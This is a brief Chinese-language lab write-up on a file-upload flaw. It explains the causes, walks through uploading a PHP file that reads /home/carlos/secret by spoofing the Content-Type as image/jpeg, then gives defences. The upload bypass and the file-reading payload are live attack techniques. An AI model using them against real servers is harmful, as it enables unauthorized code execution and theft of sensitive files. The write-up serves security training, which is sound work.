# 实验名称：上传Web shell 远程执行代码

## 基本信息
- **难度** 初级
- **类别** 文件上传漏洞

## 漏洞原理
- 服务器没有检查文件合法性
- 没有检查文件头
- 没有禁止执行php等代码
- 没有重命名上传文件
## 攻击步骤
- 制作一个`exploit.php -> echo "<?php echo file_get_contents('/home/carlos/secret'); ?>" > exploit.php`
- 找到网站上传文件位置选择exploit.php上传并用burp拦截这条请求将php文件格式修改为`image/jpeg`然后发送
- 检查文件位置使用burp向服务器发送`GET /files/avatars/exploit.php HTTP/1.1`
- 获取flag
## 防御措施
- 使用白名单检查文件格式
- 设置 open_basedir 限制可访问目录
- 使用绝对路径而非拼接用户输入
## 总结
- 利用服务器未校验文件类型的漏洞，上传恶意 PHP 文件并执行，读取服务器敏感文件获取 flag